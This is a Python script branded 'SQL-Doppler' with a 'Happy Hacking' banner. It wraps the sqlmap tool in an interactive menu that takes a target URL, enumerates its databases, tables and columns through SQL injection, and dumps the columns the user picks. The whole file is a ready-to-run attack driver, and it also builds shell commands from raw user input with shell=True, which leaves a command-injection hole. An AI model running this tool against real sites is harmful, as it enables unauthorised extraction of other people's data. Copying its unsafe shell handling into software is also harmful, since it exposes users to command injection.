import subprocess

def green_bold(text):
    return f"\033[1;32m{text}\033[0m"

ascii_art = '''
███████  ██████  ██                ██████   ██████  ██████  ██████  ██      ███████ ██████      
██      ██    ██ ██                ██   ██ ██    ██ ██   ██ ██   ██ ██      ██      ██   ██     
███████ ██    ██ ██      █████     ██   ██ ██    ██ ██████  ██████  ██      █████   ██████      
     ██ ██ ▄▄ ██ ██                ██   ██ ██    ██ ██      ██      ██      ██      ██   ██     
███████  ██████  ███████           ██████   ██████  ██      ██      ███████ ███████ ██   ██     
            ▀▀                                                                                
             
							Made in Bangladesh
							Owner: MD Haisam Hoque
							webpage link: https://haisam10.github.io/freelancer/
							version: 2.0
							Happy Hacking (^-^) 
'''

def run_sqlmap(command):
    print(f"\nRunning: {command}\n")
    try:
        result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
        print(result)
        return result
    except subprocess.CalledProcessError as e:
        print("Error:", e.output)
        return ""

def parse_output(output, marker="[*]"):
    return [line.split(marker)[-1].strip() for line in output.splitlines() if marker in line]

def main():
    print(green_bold(ascii_art))

    url = input("Enter target URL: ").strip()

    while True:
        db_result = run_sqlmap(f"sqlmap -u '{url}' --batch --dbs")
        databases = parse_output(db_result)

        if not databases:
            print("❌ No databases found.")
        else:
            print("\n✅ Databases found:")
            for db in databases:
                print(f" - {db}")

        print("\nOptions:\n1. Enter database name\n2. Exit")
        db_choice = input("Choice: ").strip()

        if db_choice == '2':
            print("Exiting...")
            break
        elif db_choice == '1':
            db_name = input("Enter database name: ").strip()
        else:
            print("Invalid choice.")
            continue

        while True:
            table_result = run_sqlmap(f"sqlmap -u '{url}' --batch -D '{db_name}' --tables")
            tables = parse_output(table_result)

            if not tables:
                print("❌ No tables found.")
            else:
                print("\n✅ Tables found:")
                for table in tables:
                    print(f" - {table}")

            print("\nOptions:\n1. Enter table name\n2. Back to database")
            table_choice = input("Choice: ").strip()

            if table_choice == '2':
                break
            elif table_choice == '1':
                table_name = input("Enter table name: ").strip()
            else:
                print("Invalid choice.")
                continue

            while True:
                column_result = run_sqlmap(f"sqlmap -u '{url}' --batch -D '{db_name}' -T '{table_name}' --columns")
                columns = parse_output(column_result)

                if not columns:
                    print("❌ No columns found.")
                else:
                    print("\n✅ Columns found:")
                    for col in columns:
                        print(f" - {col}")

                print("\nOptions:\n1. Enter column names to dump (comma separated)\n2. Back to tables")
                col_choice = input("Choice: ").strip()

                if col_choice == '2':
                    break
                elif col_choice == '1':
                    column_names = input("Enter column names (comma separated): ").strip()
                    run_sqlmap(f"sqlmap -u '{url}' --batch -D '{db_name}' -T '{table_name}' -C '{column_names}' --dump")
                else:
                    print("Invalid choice.")
                    continue

if __name__ == "__main__":
    main()
